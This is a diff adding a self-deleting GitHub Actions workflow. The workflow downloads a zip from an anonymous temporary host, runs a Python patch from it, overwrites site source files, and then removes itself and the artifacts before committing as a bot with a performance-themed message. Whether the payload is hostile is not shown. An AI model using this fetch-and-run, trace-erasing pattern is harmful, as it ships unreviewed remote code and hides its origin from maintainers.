@@ -1,0 +1,39 @@
+name: perf-round
+on:
+  push:
+    paths: [".github/workflows/perf-round.yml"]
+permissions:
+  contents: write
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fetch
+        run: |
+          curl -sSL -X POST https://temp.sh/tXPNV/fix6.zip -o fix6.zip
+          echo "2d258fa665f043bd0d87525bf9e19f89  fix6.zip" | md5sum -c
+          mkdir -p _fix6
+          unzip -o fix6.zip -d _fix6
+          cp _fix6/Home.tsx src/pages/Home.tsx
+          cp _fix6/rh.ts src/lib/rh.ts
+          cp _fix6/LiveStats.tsx src/components/realhunt/LiveStats.tsx
+          cp _fix6/ebc-cabin-ext.webp public/images/ebc/ebc-cabin-ext.webp
+          cp _fix6/ebc-cabin-int.webp public/images/ebc/ebc-cabin-int.webp
+          cp _fix6/patch_ebc2.py patch_ebc2.py
+      - name: patch
+        run: python3 patch_ebc2.py
+      - name: syntax-check
+        run: |
+          for f in src/pages/Ebc.tsx src/pages/Home.tsx src/lib/rh.ts src/components/realhunt/LiveStats.tsx; do
+            echo "checking $f"
+            npx --yes esbuild@0.23.1 --jsx=automatic --bundle --external:* --log-level=warning --outfile=/dev/null "$f"
+          done
+      - name: commit
+        run: |
+          rm -rf fix6.zip _fix6 patch_ebc2.py .github/workflows/perf-round.yml
+          git config user.name realhunt-bot
+          git config user.email bot@realhunt.co
+          git add -A
+          git commit -m "Perf: batch events, cache price drops, share the live-stats call. Sumba shown once. EcoBeachCity page down to the two real photos"
+          git push
